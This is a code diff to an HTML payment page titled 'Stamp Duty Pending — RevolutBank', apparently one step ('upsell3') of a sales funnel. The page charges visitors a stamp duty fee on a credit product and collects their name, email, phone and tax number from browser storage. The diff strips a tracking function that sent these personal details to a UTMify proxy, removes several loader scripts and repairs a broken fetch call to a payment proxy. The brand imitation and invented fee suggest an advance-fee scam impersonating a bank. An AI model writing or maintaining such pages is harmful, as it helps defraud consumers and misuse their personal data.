@@ -16,8 +16,6 @@ window.apiUrl = window.apiUrl || function (p) {
 };
 </script>
 <script src="../extensions/api-base.js"></script>
-<script src="../extensions/fees-loader.js"></script>
-<script src="../extensions/upsell-fees-bridge.js"></script>
 <meta name="viewport" content="width=device-width,initial-scale=1,maximum-scale=1"/>
 <title>Stamp Duty Pending — RevolutBank</title>
 
@@ -245,9 +243,6 @@ function getPayAmount(){ return (window.resolveUpsellAmount||function(f){return 
 window.addEventListener('upsell-fee-ready',function(ev){ if(ev&&ev.detail&&ev.detail.amount!=null) PAY_AMOUNT=ev.detail.amount; });
 window.addEventListener('funil-fees-ready',function(){ PAY_AMOUNT=getPayAmount(); });
 
-const WAYMB_API    = "";
-const UTMIFY_API   = '/api/utmify-proxy';
-
 function utcNow(){ return new Date().toISOString().replace("T"," ").slice(0,19); }
 function getPhone(){ return (localStorage.getItem("telefone")||localStorage.getItem("telephone")||localStorage.getItem("phone")||"").replace(/\D/g,""); }
 function setModalBody(html){ document.getElementById("modalBody").innerHTML=html; }
@@ -269,21 +264,6 @@ function getUtmParams(){
   var p=new URLSearchParams(window.location.search);
   function g(k){ return p.get(k)||localStorage.getItem(k)||null; }
   return {src:g('src'),sck:g('sck'),utm_source:g('utm_source'),utm_campaign:g('utm_campaign'),utm_medium:g('utm_medium'),utm_content:g('utm_content'),utm_term:g('utm_term')};
-}
-async function sendUtmify(status,orderId,createdAt,approvedDate){
-  var nome=localStorage.getItem('nome')||'Customer';
-  var email=localStorage.getItem('email')||'customer@revolutbank.com';
-  var phone=(localStorage.getItem('telefone')||localStorage.getItem('telephone')||localStorage.getItem('phone')||'').replace(/[^0-9]/g,'');
-  var doc=(localStorage.getItem('nif')||localStorage.getItem('cpf')||'').replace(/[^0-9]/g,'')||null;
-  var cents=Math.round(getPayAmount(23.91)*100);
-  try{
-    await fetch(apiUrl(UTMIFY_API),{method:'POST',headers:{'Content-Type':'application/json',},
-      body:JSON.stringify({orderId,platform:'RevolutBankCredit',paymentMethod:'card',status,createdAt,approvedDate:approvedDate||null,refundedAt:null,
-        customer:{name:nome,email,phone:phone||null,document:doc,country:'PT'},
-        products:[{id:'imposto-selo',name:'Stamp Duty — RevolutBank Credit',planId:null,planName:'upsell 3',quantity:1,priceInCents:cents}],
-        trackingParameters:getUtmParams(),
-        commission:{totalPriceInCents:cents,gatewayFeeInCents:0,userCommissionInCents:cents,currency:'EUR'},isTest:false})});
-  }catch(e){console.warn('UTMify:',e);}
 }
 
 function startPolling(txId){
@@ -326,7 +306,7 @@ async function startPayment(phone){
   const doc=(localStorage.getItem("nif")||localStorage.getItem("cpf")||"999999999").replace(/\D/g,"")||"999999999";
   setModalBody('<div class="modal-status loading" style="padding:20px"><span style="font-size:28px">⏳</span><br/><br/>Processing your payment...</div>');
   try{
-    const res=await fetch(apiUrl("/api/payment-proxy?action=create",{method:"POST",headers:{"Content-Type":"application/json"},
+    const res=await fetch(apiUrl("/api/payment-proxy?action=create"),{method:"POST",headers:{"Content-Type":"application/json"},
 
       body:JSON.stringify({amount:getPayAmount(),method:'card',currency:"EUR",payer:{name:nome,email,document:doc,phone:phone},product:"imposto-selo",paymentDescription:"Stamp Duty",_utms:getUtmParams()})});
     const data=await res.json();
@@ -353,11 +333,6 @@ function abrirModal(){
 </script>
 
 <script>window.__FUNIL_PAGE__="upsell3";</script>
-<script src="../extensions/api-base.js"></script><script src="../extensions/fees-loader.js"></script>
-<script src="../extensions/upsell-fees-bridge.js"></script>
-<script src="../extensions/messages-catalog.js"></script>
-<script src="../extensions/site-messages.js"></script>
-<script src="../extensions/tracking-config-loader.js"></script>
 <script src="../extensions/tracker.js"></script>
 </body>
 </html>
